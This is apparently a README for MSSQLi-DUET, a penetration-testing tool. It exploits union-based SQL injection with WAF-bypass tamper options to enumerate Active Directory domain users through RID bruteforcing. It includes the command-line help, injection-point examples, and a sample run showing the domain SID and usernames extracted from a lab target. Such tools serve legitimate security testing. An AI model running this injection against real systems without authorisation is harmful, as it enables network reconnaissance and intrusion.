# MSSQLi-DUET - MSSQL Injection-based Domain User Enumeration Tool

SQL injection script for MSSQL that extracts domain users from an Active Directory environment based on RID bruteforcing. Supports various forms of WAF bypass techniques through the implementation of SQLmap tamper functions. Additional tamper functions can be incorporated by the user depending on the situation and environment.

Currently only support union-based injection. Planning to add other techniques later. More samples and test cases are required to fully test tool's functionality, feedback and comments are greatly welcomed and appreciated!

## Usage
### Script Help
```
python3 mssqli-duet.py -h
usage: mssqli-duet.py [-h] -i INJECTION [-e ENCODING] -t TIME_DELAY -rid
                      RID_RANGE [-ssl SSL] -p PARAMETER [-proxy PROXY]
                      [-o OUTFILE] -r REQUEST_FILE

MSSQLi-DUET - MSSQL (Injection-based) Domain User Enumeration Tool

optional arguments:
  -h, --help            show this help message and exit
  -i INJECTION, --injection INJECTION
                        Injection point. Provide only the data needed to
                        escape the query.
  -e ENCODING, --encoding ENCODING
                        Type of encoding: unicode, doubleencode, unmagicquotes
  -t TIME_DELAY, --time_delay TIME_DELAY
                        Time delay for requests.
  -rid RID_RANGE, --rid_range RID_RANGE
                        Hypenated range of RIDs to bruteforce. Ex: 1000-1200
  -ssl SSL, --ssl SSL   Add flag for HTTPS
  -p PARAMETER, --parameter PARAMETER
                        Vulnerable parameter
  -proxy PROXY, --proxy PROXY
                        Proxy connection string. Ex: 127.0.0.1:8080
  -o OUTFILE, --outfile OUTFILE
                        Outfile for username enumeration results.
  -r REQUEST_FILE, --request_file REQUEST_FILE
                        Raw request file saved from Burp

Prepare to be enumerated!
```

### How to use
After identifying a union-based SQL injection in an application, copy the raw request from Burp Suite using the 'copy to file' feature.

Pass the saved request to DUET with the `-r` flag. Specify the vulnerable parameter and well as the point of injection. As an example, if the parameter "element" is susceptible to SQL injection, `-p` will be "element". DUET will build out all the SQL injection queries automatically, but specification for the initial injection needs to be provided. Meaning, if the injection occurs because of a single apostrophe after the parameter data, this is what would be specified for the `-i` argument. 
```
Ex: test' 
    test'))
    test")"
```

### Example
```
python3 mssqli-duet.py -i "carbon'" -t 0 -rid 1000-1200 -p element -r testrequest.req -proxy 127.0.0.1:8080
[+] Collected request data:
Target URL = http://192.168.11.22/search2.php?element=carbon
Method = GET
Content-Type = applcation/x-www-form-urlencoded


[+] Determining the number of columns in the table...
        [!] Number of columns is  3
[+] Determining column type...
        [!] Column type is null
[+] Discovering domain name...
        [+] Domain = NEUTRINO
[+] Discovering domain SID...
S-1-5-21-4142252318-1896537706-4233180933-

[+] Enumerating Active Directory via SIDs...

NEUTRINO\HYDROGENDC01$
NEUTRINO\DnsAdmins
NEUTRINO\DnsUpdateProxy
NEUTRINO\HELIUM$
NEUTRINO\BORON$
NEUTRINO\BERYLLIUM$
NEUTRINO\aeinstein
NEUTRINO\bbobberson
NEUTRINO\csagan
NEUTRINO\ccheese
NEUTRINO\svc_web
NEUTRINO\svc_sql
```

## References 
https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
